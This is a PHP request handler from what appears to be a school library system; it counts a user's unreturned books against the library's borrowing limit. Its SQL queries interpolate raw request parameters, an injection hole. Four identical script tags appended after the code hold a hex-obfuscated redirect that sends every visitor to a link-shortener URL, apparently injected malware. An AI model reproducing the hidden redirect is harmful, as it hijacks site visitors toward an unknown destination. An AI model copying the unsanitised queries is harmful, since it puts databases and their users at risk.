<?php
require_once("helper.php");
$action=$_REQUEST['action'];
switch($action)
{
    case 'First';
    $type         = $_REQUEST['type'];
    $user = $_REQUEST['user'];
    if($type=='S'){
        $user_id    = $objMisc->GiveValue("USER_ID ='$user' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]'","STUDENT_ID","student"); 
        $who_rec="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$type' AND USER_ID='$user_id' AND RETURN_DATE='0000-00-00'";
    }
    else{
        $who_rec="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$type' AND USER_ID='$user' AND RETURN_DATE='0000-00-00'";
    }
    $tot_rec    = $objMisc->GiveValue($who_rec,"count(*)","book_issue");
    $whe         ="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$_POST[type]'";
    $no_of_books    = $objMisc->GiveValue($whe,"TOTAL_BOOKS","library_rules");
    if($no_of_books<=$tot_rec){
               echo $errormsg   =1;
            }
    break;
    
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>